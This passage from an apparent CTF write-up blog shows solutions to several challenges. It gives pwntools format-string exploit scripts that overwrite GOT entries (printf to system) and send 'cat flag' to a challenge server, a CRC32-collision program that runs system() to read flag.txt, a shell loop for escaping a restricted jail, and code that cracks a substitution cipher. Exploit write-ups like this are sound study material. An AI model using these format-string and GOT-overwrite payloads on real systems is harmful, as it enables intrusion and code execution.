ELF</span></span><br><span class="line"><span class="comment">     specification now demands that dependencies between the modules</span></span><br><span class="line"><span class="comment">     are taken into account.  I.e., the destructor for a module is</span></span><br><span class="line"><span class="comment">     called before the ones for any of its dependencies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To make things more complicated, we cannot simply use the reverse</span></span><br><span class="line"><span class="comment">     order of the constructors.  Since the user might have loaded objects</span></span><br><span class="line"><span class="comment">     using `dlopen&#x27; there are possibly several other modules with its</span></span><br><span class="line"><span class="comment">     dependencies to be taken into account.  Therefore we have to start</span></span><br><span class="line"><span class="comment">     determining the order of the modules once again from the beginning.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We run the destructors of the main namespaces last.  As for the</span></span><br><span class="line"><span class="comment">     other namespaces, we pick run the destructors in them in reverse</span></span><br><span class="line"><span class="comment">     order of the namespace ID.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment"> auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  )</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">    <span class="comment">// .........</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// .........</span></span><br><span class="line">    <span class="comment">// .........</span></span><br><span class="line">    <span class="comment">// .........</span></span><br><span class="line">    <span class="comment">// .........</span></span><br><span class="line">    <span class="comment">// .........</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>And</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __libc_maybe_call (__pthread_mutex_lock, (&amp;(NAME).mutex), 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __libc_maybe_call (__pthread_mutex_unlock, (&amp;(NAME).mutex), 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>_dl_fini()</code> will be registered by <code>_cxa_atexit</code> in <code>__libc_start_main()</code>. And <code>_dl_fini()</code> will be called by <code>__run_exit_handlers()</code> when the program exits. And <code>rtld_lock_default_lock_recursive</code> will be called by <code>_dl_fini()</code>. So if we overwrite this field, we can jump back to main when the program exits. Then turn the challenge into a normal format string challenge.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tty</span><br><span class="line"></span><br><span class="line"><span class="comment"># $r14   : 0x00007fffffffdc40  →  0x00007ffff7e2b170  →  0x0000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span>(<span class="params">debug=<span class="literal">False</span></span>):</span></span><br><span class="line">    REMOTE_MODE = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    REMOTE_MODE = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    sh = process(<span class="string">&quot;./money-printer2&quot;</span>,stdin=PTY,raw=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment">#sh = None</span></span><br><span class="line">    <span class="keyword">if</span> REMOTE_MODE == <span class="number">1</span>:</span><br><span class="line">        sh = remote(<span class="string">&quot;greed.sdc.tf&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">    context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">    backdoor = <span class="number">0x00000000004008F2</span></span><br><span class="line">    exit_got = <span class="number">0x601020</span></span><br><span class="line">    tob = <span class="keyword">lambda</span> x: <span class="built_in">str</span>(x).encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> REMOTE_MODE == <span class="number">0</span> <span class="keyword">and</span> debug == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;?&quot;</span>, tob(<span class="number">0xFFFFFB00</span>))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;%4196096c%11$lln&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x41&#x27;</span>)+<span class="string">b&#x27;\x60\xaf&#x27;</span></span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;?&#x27;</span>, payload+<span class="string">b&#x27;\4\4&#x27;</span>)</span><br><span class="line">    printf_got = <span class="number">0x601038</span></span><br><span class="line">    system_plt = <span class="number">0x4006B0</span></span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;?&quot;</span>, tob(<span class="number">0xFFFFFB00</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;?&#x27;</span>, fmtstr_payload(<span class="number">8</span>, &#123;printf_got: system_plt&#125;))</span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;me!&quot;</span>, tob(<span class="number">0xFFFFFB00</span>))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;cat flag; cat flag.txt; cat flag*&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> sh</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># sh = hack(False)</span></span><br><span class="line"><span class="comment"># sh.interactive()</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = hack(sys.argv[<span class="number">2</span>] == <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Success&quot;</span>)</span><br><span class="line">        dt = sh.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;getflag.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(dt)</span><br><span class="line">        sh.interactive()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h4 id="Canary">Canary</h4><p>There are also some residual stack pointers on the stack. We can partially overwrite them and make them point to the canary. Then overwrite the GOT entry of <code>__stack_chk_fail</code> to <code>main</code> and turn the challenge into a normal format string challenge.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tty</span><br><span class="line"></span><br><span class="line"><span class="comment"># $r14   : 0x00007fffffffdc40  →  0x00007ffff7e2b170  →  0x0000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span>(<span class="params">debug=<span class="literal">False</span></span>):</span></span><br><span class="line">    REMOTE_MODE = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    REMOTE_MODE = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    sh = process(<span class="string">&quot;./money-printer2&quot;</span>,stdin=PTY,raw=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> REMOTE_MODE == <span class="number">1</span>:</span><br><span class="line">        sh = remote(<span class="string">&quot;greed.sdc.tf&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">    context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">    backdoor = <span class="number">0x00000000004008F2</span></span><br><span class="line">    exit_got = <span class="number">0x601020</span></span><br><span class="line">    tob = <span class="keyword">lambda</span> x: <span class="built_in">str</span>(x).encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> REMOTE_MODE == <span class="number">0</span> <span class="keyword">and</span> debug == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;?&quot;</span>, tob(<span class="number">0xFFFFFB00</span>))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;%4196096c%11$lln&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x41&#x27;</span>)+<span class="string">b&#x27;\x60\xaf&#x27;</span></span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;?&#x27;</span>, payload+<span class="string">b&#x27;\4\4&#x27;</span>)</span><br><span class="line">    <span class="comment">#sleep(15)</span></span><br><span class="line">    r = sh.recvuntil(<span class="string">b&#x27;\x60\xaf&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;\x60\xaf&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">        <span class="keyword">raise</span> EOFError</span><br><span class="line">    r = sh.recvuntil(<span class="string">b&#x27;gotten me&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;gotten me&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">        <span class="keyword">raise</span> EOFError</span><br><span class="line">    <span class="keyword">return</span> sh</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = hack(<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Success&quot;</span>)</span><br><span class="line">        sh.interactive()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>Didn’t have the luck to hit the 1/4096 probability :(</p><h2 id="Misc">Misc</h2><h3 id="Secure-Runner">Secure Runner</h3><p>CRC32 collision. Easy to find with <code>https://github.com/theonlypwner/crc32/</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_GUESS 10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">srand(time(<span class="literal">NULL</span>));</span><br><span class="line">system(<span class="string">&quot;ls -al; cat flag.txt&quot;</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_guesses = NUM_GUESS;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">pow</span>(<span class="number">2</span>, num_guesses) - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> secret = rand() % max;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Guess a number from 0 to %u in %u guesses:\n&quot;</span>, max, num_guesses);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(num_guesses &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (num_guesses != NUM_GUESS) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Next Guess (%u left):\n&quot;</span>, num_guesses);</span><br><span class="line">&#125;</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> guess = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%u&quot;</span>,&amp;guess);</span><br><span class="line"><span class="keyword">if</span> (guess == secret) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Congrats, you won!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (secret &lt; guess) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Number is lower! &quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Number is higher! &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">num_guesses--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You ran out of guesses :(\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SduBPZpheWz</span></span><br></pre></td></tr></table></figure><h3 id="Fork-bomb-protector">Fork bomb protector</h3><p>Use the built-in command to read the flag.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo *</span><br><span class="line">while read -r data;</span><br><span class="line">do</span><br><span class="line">echo &quot;$data&quot;;</span><br><span class="line">done &lt; &quot;flag.txt&quot;;</span><br></pre></td></tr></table></figure><h2 id="Crypto">Crypto</h2><h3 id="Jumbled-snake">Jumbled snake</h3><p>First, recover the key with<br><code>the_quick_brown_fox_jumps_over_the_lazy_dog</code><br>By regex matching, we can find the pattern easily.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    match = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;print_flag.py.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        code = f.read()</span><br><span class="line">        <span class="built_in">print</span>(code)</span><br><span class="line">        charset = string.printable</span><br><span class="line">        <span class="keyword">for</span> I <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="comment"># find pattern xxxIxxxxxIxxxxxIxxxIxxxxxIxxxxIxxxIxxxxIxxx</span></span><br><span class="line">            <span class="comment"># I is a printable character</span></span><br><span class="line">            <span class="comment"># x is arbitrary character</span></span><br><span class="line">            regex = <span class="string">&#x27;...&#x27;</span>+I+<span class="string">&#x27;.....&#x27;</span>+I+<span class="string">&#x27;.....&#x27;</span>+I+<span class="string">&#x27;...&#x27;</span>+I+<span class="string">&#x27;.....&#x27;</span>+I+<span class="string">&#x27;....&#x27;</span>+I+<span class="string">&#x27;...&#x27;</span>+I+<span class="string">&#x27;....&#x27;</span>+I+<span class="string">&#x27;...&#x27;</span></span><br><span class="line">            match = re.search(regex, code)</span><br><span class="line">            <span class="keyword">if</span> match:</span><br><span class="line">                <span class="built_in">print</span>(match)</span><br><span class="line">                <span class="built_in">print</span>(I)</span><br><span class="line">                <span class="built_in">print</span>(match)</span><br><span class="line">                <span class="comment"># get the matched string</span></span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>Now recover the key with <code>__doc__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">origin = <span class="string">&quot;the_quick_brown_fox_jumps_over_the_lazy_dog&quot;</span></span><br><span class="line">encoded = match.group()</span><br><span class="line">span = match.span()</span><br><span class="line">key = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(origin)):</span><br><span class="line">    key[encoded[i]] = origin[i]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;print_flag.py.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    e = f.read()</span><br><span class="line">    encoded = <span class="string">&quot;&#x27;: 123456789.0, &#x27;items&#x27;:[]&#125;&quot;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(encoded):</span><br><span class="line">        key[e[i+span[<span class="number">1</span>]]] = encoded[i]</span><br><span class="line">        i+=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>Some keys can be identified by ourself now</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key[<span class="string">&#x27;y&#x27;</span>] = <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">key[<span class="string">&#x27;]&#x27;</span>] = <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">key[<span class="string">&#x27;b&#x27;</span>] = <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">key[<span class="string">&#x27;J&#x27;</span>] = <span class="string">&#x27;=&#x27;</span></span><br><span class="line">key[<span class="string">&#x27;^&#x27;</span>] = <span class="string">&#x27;(&#x27;</span></span><br><span class="line">key[<span class="string">&#x27;g&#x27;</span>] = <span class="string">&#x27;)&#x27;</span></span><br><span class="line">key[<span class="string">&#x27;.&#x27;</span>] = <span class="string">&#x27;#&#x27;</span></span><br><span class="line">key[<span class="string">&#x27;=&#x27;</span>] = <span class="string">&#x27;!&#x27;</span></span><br></pre></td></tr></table></figure><p>Now try to recover the script, we can notice the second hint.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decode_flag.__doc__.upper()[<span class="number">2</span>:<span class="number">45</span>] == reverse(check.__doc__)</span><br></pre></td></tr></table></figure><p>And recover the script with this hint.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    origin = <span class="string">&quot;&#123;&#x27;the_quick_brown_fox_jumps_over_the_lazy_dog&#x27;:&quot;</span></span><br><span class="line">    check_doc = <span class="string">&quot;&quot;&quot;F+</span></span><br><span class="line"><span class="string">_f5&#125;I_7|0_17s+_B&amp;N)K_n+(_,O+1q_CQ*)`_7|0&quot;&quot;&quot;</span></span><br><span class="line">    check_doc = <span class="built_in">list</span>(<span class="built_in">reversed</span>(check_doc))</span><br><span class="line">    origin_upper = origin.upper()[<span class="number">2</span>:<span class="number">45</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(origin_upper)):</span><br><span class="line">        <span class="keyword">if</span> check_doc[i] <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            key[check_doc[i]] = origin_upper[i]</span><br></pre></td></tr></table></figure><p>And finally we have</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rand_key</span>(<span class="params">charset: <span class="built_in">str</span> = string.printable</span>):</span></span><br><span class="line">    chars_left = <span class="built_in">list</span>(charset)</span><br><span class="line">    key = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">        val = secrets.choice(chars_left)</span><br><span class="line">        chars_left.remove(val)</span><br><span class="line">        key[char] = val</span><br><span class="line">    <span class="keyword">assert</span> <span class="keyword">not</span> chars_left</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subs</span>(<span class="params">msg: <span class="built_in">str</span>, key</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(key[c] <span class="keyword">for</span> c <span class="keyword">in</span> msg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 5 5 3 5 4 3 4 3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    match = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;print_flag.py.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        code = f.read()</span><br><span class="line">        <span class="built_in">print</span>(code)</span><br><span class="line">        charset = string.printable</span><br><span class="line">        <span class="keyword">for</span> I <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="comment"># find 